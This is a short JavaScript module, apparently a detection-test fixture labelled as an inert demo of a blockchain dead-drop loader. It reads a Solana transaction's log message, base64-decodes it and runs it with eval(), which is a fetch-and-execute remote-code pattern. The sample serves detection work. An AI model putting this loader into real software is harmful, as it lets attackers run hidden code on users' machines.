// [FAKE-DEMO] Inert sample for blockchain dead-drop detections.
const { Connection, PublicKey } = require('@solana/web3.js');

async function pollMemoPayload() {
  const connection = new Connection('https://api.mainnet-beta.solana.com');
  const target = new PublicKey('11111111111111111111111111111111');
  const signatures = await connection.getSignaturesForAddress(target, { limit: 1 });
  const tx = await connection.getTransaction(signatures[0].signature);
  const staged = Buffer.from(tx.meta.logMessages[0], 'base64').toString('utf8');
  return eval(staged);
}

module.exports = { pollMemoPayload };
